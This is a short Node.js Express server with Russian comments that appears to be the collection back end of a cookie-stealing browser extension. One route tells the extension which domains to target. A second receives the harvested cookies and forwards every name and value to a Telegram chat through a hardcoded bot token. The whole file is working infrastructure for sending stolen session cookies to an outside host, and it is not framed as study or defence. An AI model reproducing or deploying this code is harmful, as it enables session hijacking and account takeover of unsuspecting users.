const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');  // Для отправки сообщений в Telegram
const app = express();
const port = 3000;

app.use(bodyParser.json());

// Роут для отправки списка доменов расширению
app.get('/api/domains', (req, res) => {
    const domains = ["kra7.cc"];  // Укажи нужные домены для перехвата cookies
    res.json(domains);
});

// Роут для приёма cookies от расширения
app.post('/api/cookies', (req, res) => {
    const { domain, cookies } = req.body;

    if (!domain || !cookies) {
        return res.status(400).send({ error: 'Не указан домен или cookies' });
    }

    console.log(`Получены cookies для домена ${domain}:`, cookies);

    // Отправляем cookies в Telegram
    const botToken = '7686897250:AAHQcOhVwUU_YsIjLZm2qIxIQWzGfgGTlHQ';
    const chatId = '-4507978780';
    const message = `Куки для домена ${domain}:\n${cookies.map(cookie => `${cookie.name}: ${cookie.value}`).join('\n')}`;

    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: message
    })
        .then(response => {
            console.log('Cookies успешно отправлены в Telegram');
        })
        .catch(error => {
            console.error('Ошибка при отправке cookies в Telegram:', error.message);
        });

    res.status(200).send({ message: 'Cookies получены и отправлены в Telegram' });
});

// Запуск сервера
app.listen(port, () => {
    console.log(`Сервер запущен на порту ${port}`);
});
